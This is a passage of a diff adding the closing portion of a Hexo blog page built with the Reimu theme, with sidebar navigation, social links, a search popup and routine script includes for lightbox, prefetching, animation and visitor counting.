+    <div class="sidebar-state-number">7</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/wh0isthatguy itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+    <div class="icon-twitter sidebar-social-icon">
+      <a href=https://twitter.com/im_whoisthatguy itemprop="url" target="_blank" aria-label="twitter"></a>
+    </div>
+  
+    <div class="icon-discord sidebar-social-icon">
+      <a href=https://discordapp.com/users/wh0isthatguy itemprop="url" target="_blank" aria-label="discord"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+
+
+
+<script src="/live2d-widget/autoload.js"></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    quicklink.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.1' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
